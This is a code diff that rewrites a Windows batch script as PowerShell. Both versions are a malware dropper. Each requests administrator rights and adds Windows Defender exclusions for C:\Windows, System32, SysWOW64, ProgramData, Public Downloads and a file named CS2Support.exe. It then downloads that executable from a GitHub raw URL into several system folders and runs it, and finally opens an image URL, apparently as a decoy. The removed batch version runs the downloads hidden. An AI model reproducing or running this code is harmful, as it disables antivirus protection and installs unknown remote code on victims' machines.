@@ -1,35 +1,33 @@
-@echo off
-:: Check if running as administrator
-whoami /groups | find "S-1-5-32-544" >nul 2>&1
-if %errorlevel% neq 0 (
-    :: Request admin privileges if not already an administrator
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
+# Check if running as Administrator
+If (-Not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    # Relaunch the script with Administrator privileges
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    Exit
+}
 
-:main
-:: Confirm that the script has administrator privileges and proceed
-echo Running with administrator privileges.
+# Proceed with the script
+Write-Host "Running with Administrator privileges."
 
-:: Example commands that require admin privileges
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'CS2Support.exe'"
+# Add exclusions to Defender
+Add-MpPreference -ExclusionPath "C:\ProgramData"
+Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
+Add-MpPreference -ExclusionPath "C:\Windows\System32"
+Add-MpPreference -ExclusionPath "C:\Windows\SysWOW64"
+Add-MpPreference -ExclusionPath "C:\Windows"
+Add-MpPreference -ExclusionExtension "CS2Support.exe"
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Users\Public\Downloads\CS2Support.exe'"
-Start-Process "C:\Users\Public\Downloads\CS2Support.exe" -WindowStyle Hidden
+# Download and execute the file
+Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Users\Public\Downloads\CS2Support.exe"
+Start-Process -FilePath "C:\Users\Public\Downloads\CS2Support.exe" -NoNewWindow
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\System32\CS2Support.exe'"
-Start-Process "C:\Windows\System32\CS2Support.exe" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Windows\System32\CS2Support.exe"
+Start-Process -FilePath "C:\Windows\System32\CS2Support.exe" -NoNewWindow
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\SysWOW64\CS2Support.exe'"
-Start-Process "C:\Windows\SysWOW64\CS2Support.exe" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Windows\SysWOW64\CS2Support.exe"
+Start-Process -FilePath "C:\Windows\SysWOW64\CS2Support.exe" -NoNewWindow
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\CS2Support.exe'"
-Start-Process "C:\Windows\CS2Support.exe" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Windows\CS2Support.exe"
+Start-Process -FilePath "C:\Windows\CS2Support.exe" -NoNewWindow
 
-start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
-exit /b
+# Open a URL
+Start-Process "https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg"
